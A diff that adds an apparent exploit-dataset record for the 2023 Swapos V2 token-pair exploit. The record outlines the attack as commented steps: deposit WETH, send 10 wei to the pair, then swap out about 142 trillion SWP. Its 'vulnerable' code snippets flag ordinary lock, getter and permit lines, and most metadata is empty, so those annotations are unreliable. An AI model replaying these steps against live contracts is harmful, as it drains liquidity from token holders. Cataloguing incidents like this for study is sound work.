@@ -1,0 +1,29 @@
+{
+ "id": "2023__2023-04-18_Swapos_InitialReserveManipulation",
+ "source_file": "2023/2023-04-18_Swapos_InitialReserveManipulation.md",
+ "title": "Swapos V2 Exploit — Initial Reserve Manipulation via Minimal WETH Transfer",
+ "date": "2023-04-18",
+ "protocol": "Swapos",
+ "chain": null,
+ "loss_raw": null,
+ "loss_usd": null,
+ "root_cause": null,
+ "attack_tx": null,
+ "vulnerable_contract": null,
+ "classes": [
+  "oracle-price-manipulation"
+ ],
+ "code_before": [
+  "// File: SwaposV2Pair.sol\n    uint public kLast; // reserve0 * reserve1, as of immediately after the most recent liquidity event  // ❌\n\n// ...\n\n    uint private unlocked = 1;  // ❌\n\n// ...\n\n        require(unlocked == 1, 'SwaposV2: LOCKED');  // ❌\n\n// ...\n\n        unlocked = 0;  // ❌\n\n// ...\n\n        unlocked = 1;  // ❌",
+  "// File: ISwaposV2Pair.sol\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);  // ❌\n\n// ...\n\n    function price0CumulativeLast() external view returns (uint);  // ❌\n\n// ...\n\n    function price1CumulativeLast() external view returns (uint);  // ❌\n\n// ...\n\n    function kLast() external view returns (uint);  // ❌\n\n// ...\n\n    function skim(address to) external;  // ❌",
+  "// File: SwaposV2ERC20.sol\n        DOMAIN_SEPARATOR = keccak256(  // ❌\n\n// ...\n\n                keccak256('EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)'),  // ❌\n\n// ...\n\n                keccak256(bytes(name)),  // ❌\n\n// ...\n\n                keccak256(bytes('1')),  // ❌\n\n// ...\n\n    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external {\n        require(deadline >= block.timestamp, 'SwaposV2: EXPIRED');  // ❌\n        bytes32 digest = keccak256(  // ❌\n            abi.encodePacked(  // ❌\n                '\\x19\\x01',\n                DOMAIN_SEPARATOR,\n                keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline))  // ❌\n            )\n        );\n        address recoveredAddress = ecrecover(digest, v, r, s);\n        require(recoveredAddress != address(0) && recoveredAddress == owner, 'SwaposV2: INVALID_SIGNATURE');\n        _approve(owner, spender, value);\n    }"
+ ],
+ "code_after": [],
+ "steps": [
+  "// → extracts 142 trillion SWP tokens for 10 wei WETH"
+ ],
+ "other_code": [
+  "// 1. WETH.deposit{value: 3 ether}()\n// 2. WETH.transfer(address(swapPos), 10)  // only 10 wei WETH to pair\n// 3. swapPos.swap(142_658_161_144_708_222_114_663, 0, address(this), \"\")\n//    → extracts 142 trillion SWP tokens for 10 wei WETH\n// 4. Log reserves after swap",
+  "interface SWAPOS {\n    function swap(uint256 amount0Out, uint256 amount1Out, address to,\n                  bytes calldata data) external;\n    function getReserves() external view returns (\n        uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);\n}"
+ ]
+}
